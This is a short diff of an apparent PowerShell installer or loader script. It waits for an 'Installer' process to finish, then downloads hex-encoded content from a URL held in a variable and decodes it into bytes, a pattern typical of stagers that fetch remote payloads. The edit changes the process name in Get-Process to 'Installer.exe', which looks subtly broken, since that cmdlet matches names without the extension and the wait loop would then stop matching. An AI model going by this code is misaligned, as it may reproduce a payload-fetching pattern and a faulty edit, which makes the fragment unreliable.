@@ -29,7 +29,7 @@ $process = [System.Diagnostics.Process]::Start($psi)
 $process.WaitForExit()
 do {
     Start-Sleep -Seconds 2
-} while (Get-Process -Name "Installer" -ErrorAction SilentlyContinue)
+} while (Get-Process -Name "Installer.exe" -ErrorAction SilentlyContinue)
 $responseC = iwr $urlC -TimeoutSec 30
 $newHexContent = $responseC.Content.Trim()
 $newBytes = HexToBytes $newHexContent
